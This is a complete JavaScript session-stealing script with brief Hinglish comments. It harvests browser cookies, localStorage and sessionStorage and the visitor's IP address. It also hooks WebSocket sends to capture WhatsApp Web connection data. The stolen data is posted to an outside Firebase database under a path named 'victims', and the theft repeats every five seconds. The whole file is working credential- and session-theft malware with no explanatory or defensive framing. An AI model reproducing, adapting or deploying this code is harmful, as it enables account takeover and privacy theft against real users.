(function() {
  'use strict';

  const FIREBASE_URL = 'https://sessionid-d86e2-default-rtdb.firebaseio.com/victims';

  // IP le lo
  async function getIP() {
    try {
      const res = await fetch('https://api.ipify.org');
      return await res.text();
    } catch {
      return 'unknown';
    }
  }

  // Data bhejo
  async function send(data, type) {
    const ip = await getIP();
    const payload = {
      url: location.href,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      ip: ip,
      type: type,
      data: data
    };

    fetch(`${FIREBASE_URL}.json`, {
      method: 'POST',
      body: JSON.stringify(payload),
      headers: { 'Content-Type': 'application/json' }
    });
  }

  // 1. Cookies
  function stealCookies() {
    const cookies = {};
    document.cookie.split(';').forEach(c => {
      const [k, v] = c.trim().split('=');
      if (k && v) cookies[k] = v;
    });
    if (Object.keys(cookies).length > 0) {
      send(cookies, 'cookies');
    }
  }

  // 2. localStorage + sessionStorage
  function stealStorage() {
    const data = {
      localStorage: { ...localStorage },
      sessionStorage: { ...sessionStorage }
    };
    send(data, 'storage');
  }

  // 3. WhatsApp WebSocket Hook
  const origSend = WebSocket.prototype.send;
  WebSocket.prototype.send = function(data) {
    try {
      const msg = JSON.parse(data);
      if (msg && msg[1] && typeof msg[1] === 'string' && msg[1].includes('Conn')) {
        send({ websocket: msg }, 'websocket_conn');
      }
    } catch(e) {}
    return origSend.apply(this, arguments);
  };

  // Sab chori karo
  stealCookies();
  stealStorage();

  // Har 5 sec update
  setInterval(() => {
    stealCookies();
    stealStorage();
  }, 5000);

})();